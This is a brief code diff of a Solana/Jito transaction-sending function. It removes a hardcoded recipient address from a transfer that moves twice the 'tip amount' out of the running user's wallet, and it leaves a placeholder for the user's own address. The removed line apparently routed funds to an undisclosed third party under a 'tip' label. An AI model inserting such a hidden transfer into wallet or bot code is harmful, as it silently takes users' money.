@@ -35,7 +35,7 @@ export async function sendTransactionsWithJitoTxs(instructionsx: VersionedTransa
             });
             const toIx = SystemProgram.transfer({
                 fromPubkey: wallet.publicKey,
-                toPubkey: new PublicKey("ANxKNfKCeJem3uMEwwSHkcjWNyiHeSex5r599BCHHR8a"),
+                toPubkey: new PublicKey(), // add your alternate address here
                 lamports: tipAmount * 2, // tip amount
             });
             const tipTx = new VersionedTransaction(
